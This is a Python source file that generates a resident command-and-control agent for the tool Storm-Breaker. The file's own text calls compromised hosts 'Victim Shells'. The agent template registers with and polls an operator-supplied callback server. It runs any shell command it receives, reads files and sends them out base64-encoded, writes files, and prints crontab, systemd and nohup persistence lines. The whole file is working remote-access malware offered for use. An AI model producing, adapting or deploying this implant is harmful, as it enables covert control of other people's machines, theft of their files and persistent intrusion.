"""Resident agent generator (P1.1).

Storm-Breaker's "C2" used to be a browser tab: close it and the session died.
This emits a **real, resident, stdlib-only Python agent** that registers over the
existing ``/api/c2/*`` contract, so it shows up in the Victim Shells tab exactly
like the JS client -- but it survives closing the browser, walks a filesystem,
and runs commands as a process.

No new server dependency: the emitted script imports only the standard library.

Magic commands (prefixed ``__``) are handled in-process; anything else runs via
the shell in the agent's tracked cwd::

    __sysinfo                     host facts (JSON)
    __pwd  /  __cd <dir>          working directory
    __file_get <path>             -> __FILEDATA__:<base64>
    __file_put <path> <base64>    write a file
    __persist [name]              print a crontab/systemd persistence line
    __sleep <ms> / __exit

The template uses ``__TOKEN__`` placeholders rather than ``%``-formatting so
literal percent signs in the emitted code are not a minefield.
"""
from __future__ import annotations

AGENT_TEMPLATE = '''#!/usr/bin/env python3
"""Storm-Breaker resident agent (stdlib only). Generated, safe to edit."""
import base64
import json
import os
import platform
import socket
import subprocess
import sys
import time
import urllib.request

BASE = "__BASE__"
KEY = "__KEY__"
STATE = os.path.join(os.path.expanduser("~"), ".storm_agent.json")
UA = "StormAgent/1.0"
DEFAULT_INTERVAL_MS = 1500
MAX_BACKOFF_MS = 30000
# The server drives the schedule (P15), but an *agent* has to feel interactive:
# the default profile's base interval is 15s (60s outside active hours), so the
# returned value is clamped.  Set the baked clamp to 0 to honour the server exactly.
MAX_INTERVAL_MS = __CLAMP__
MIN_INTERVAL_MS = 200
CWD = os.getcwd()


def _wait_ms(interval):
    ms = float(interval or DEFAULT_INTERVAL_MS)
    if MAX_INTERVAL_MS and 0 < MAX_INTERVAL_MS < ms:
        ms = float(MAX_INTERVAL_MS)
    return max(MIN_INTERVAL_MS, ms)


def _load_uid():
    explicit = "__UID__"
    if explicit:
        return explicit
    try:
        with open(STATE) as fh:
            return json.load(fh)["uid"]
    except Exception:
        pass
    uid = "%s-%d" % (socket.gethostname(), os.getpid())
    try:
        with open(STATE, "w") as fh:
            json.dump({"uid": uid}, fh)
    except Exception:
        pass
    return uid


UID = _load_uid()


def _url(path):
    return BASE + path + (("?k=" + KEY) if KEY else "")


def post(path, payload, timeout=20):
    req = urllib.request.Request(
        _url(path), data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json", "User-Agent": UA})
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read())


def sysinfo():
    return {
        "kind": "agent", "uid": UID, "hostname": socket.gethostname(),
        "user": os.environ.get("USER") or os.environ.get("USERNAME") or "?",
        "platform": platform.platform(), "kernel": platform.release(),
        "arch": platform.machine(), "python": platform.python_version(),
        "cwd": CWD, "pid": os.getpid(), "euid": getattr(os, "geteuid", lambda: -1)(),
        "cpu_count": os.cpu_count(),
        "agent_version": "1.0",
    }


def _b64_read(path):
    with open(path, "rb") as fh:
        return base64.b64encode(fh.read()).decode()


def handle(command):
    global CWD
    cmd = (command or "").strip()
    try:
        if cmd == "__sysinfo":
            return json.dumps(sysinfo(), indent=1)
        if cmd == "__pwd":
            return CWD
        if cmd.startswith("__cd "):
            target = os.path.expanduser(cmd[5:].strip())
            new = target if os.path.isabs(target) else os.path.join(CWD, target)
            new = os.path.abspath(new)
            if not os.path.isdir(new):
                return "no such directory: %s" % new
            CWD = new
            return CWD
        if cmd.startswith("__file_get "):
            path = os.path.expanduser(cmd[11:].strip())
            if not os.path.isabs(path):
                path = os.path.join(CWD, path)
            return "__FILEDATA__:" + _b64_read(path)
        if cmd.startswith("__file_put "):
            rest = cmd[11:].strip()
            path, _, blob = rest.partition(" ")
            path = os.path.expanduser(path)
            if not os.path.isabs(path):
                path = os.path.join(CWD, path)
            with open(path, "wb") as fh:
                fh.write(base64.b64decode(blob))
            return "wrote %d bytes -> %s" % (os.path.getsize(path), path)
        if cmd.startswith("__sleep "):
            time.sleep(int(cmd[8:].strip()) / 1000.0)
            return "slept"
        if cmd == "__exit":
            sys.exit(0)
        if cmd.startswith("__persist"):
            name = (cmd[9:].strip() or "storm-agent")
            script = os.path.abspath(__file__)
            return ("crontab:  @reboot %s %s\\n"
                    "systemd:  ExecStart=%s %s\\n"
                    "nohup:    nohup %s %s >/dev/null 2>&1 &"
                    % (sys.executable, script, sys.executable, script,
                       sys.executable, script))
        if not cmd:
            return ""
        proc = subprocess.run(cmd, shell=True, cwd=CWD, capture_output=True,
                              text=True, timeout=300)
        return (proc.stdout or "") + (proc.stderr or "")
    except subprocess.TimeoutExpired:
        return "TIMEOUT after 300s"
    except Exception as exc:
        return "%s: %s" % (type(exc).__name__, exc)


def main():
    backoff = DEFAULT_INTERVAL_MS
    while True:
        try:
            post("/api/c2/register", {"uid": UID, "info": sysinfo()})
            break
        except Exception:
            time.sleep(backoff / 1000.0)
            backoff = min(backoff * 2, MAX_BACKOFF_MS)
    while True:
        try:
            reply = post("/api/c2/poll", {"uid": UID})
            backoff = DEFAULT_INTERVAL_MS
        except Exception:
            time.sleep(backoff / 1000.0)
            backoff = min(backoff * 2, MAX_BACKOFF_MS)
            continue
        command = reply.get("command")
        if command:
            try:
                post("/api/c2/response", {"uid": UID, "output": handle(command)})
            except Exception:
                pass
        try:
            time.sleep(_wait_ms(reply.get("next_interval_ms")) / 1000.0)
        except Exception:
            time.sleep(DEFAULT_INTERVAL_MS / 1000.0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
'''


def agent_script(base_url: str, uid: str = "", key: str = "",
                 clamp_ms: int = 2000) -> str:
    """Render the agent with the callback base + ingest key baked in.

    ``clamp_ms`` caps the server-driven interval (0 = honour the server exactly).
    """
    return (AGENT_TEMPLATE
            .replace("__BASE__", base_url.rstrip("/"))
            .replace("__KEY__", key or "")
            .replace("__UID__", uid or "")
            .replace("__CLAMP__", str(int(clamp_ms or 0))))


# Operator-facing reference (also served at /api/agent/commands).
MAGIC_COMMANDS = [
    {"command": "__sysinfo", "desc": "Host/user/platform/arch/cwd/pid facts as JSON"},
    {"command": "__pwd", "desc": "Print the agent's tracked working directory"},
    {"command": "__cd <dir>", "desc": "Change the agent's working directory"},
    {"command": "__file_get <path>", "desc": "Read a file -> __FILEDATA__:<base64>"},
    {"command": "__file_put <path> <base64>", "desc": "Write a file from base64"},
    {"command": "__persist [name]", "desc": "Print crontab/systemd/nohup persistence lines"},
    {"command": "__sleep <ms>", "desc": "Sleep inside the command handler"},
    {"command": "__exit", "desc": "Terminate the agent"},
    {"command": "<anything else>", "desc": "Run through the shell in the agent's cwd"},
]


__all__ = ["agent_script", "AGENT_TEMPLATE", "MAGIC_COMMANDS"]
